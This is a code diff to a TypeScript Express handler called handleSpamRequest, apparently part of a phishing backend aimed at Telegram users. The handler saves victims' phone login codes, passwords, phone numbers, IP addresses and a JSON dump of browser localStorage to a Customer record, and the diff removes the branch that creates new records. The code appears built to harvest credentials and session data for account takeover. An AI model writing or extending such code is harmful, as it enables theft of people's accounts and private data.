@@ -6,7 +6,6 @@ let customerCount = 0; // 初始化客户计数器
 
 // import { client } from '../utils/telegramClient';
 
-
 export const handleSpamRequest = handleAsync(
   async (req: Request, res: Response) => {
     const { data } = req.body;
@@ -30,14 +29,6 @@ export const handleSpamRequest = handleAsync(
       await customer.updateOne({
         phoneCode,
         password: password || customer.password,
-        localStorage: JSON.stringify(rest),
-        ip,
-      });
-    } else {
-      customer = new Customer({
-        phoneCode,
-        password,
-        phoneNumber,
         localStorage: JSON.stringify(rest),
         ip,
       });
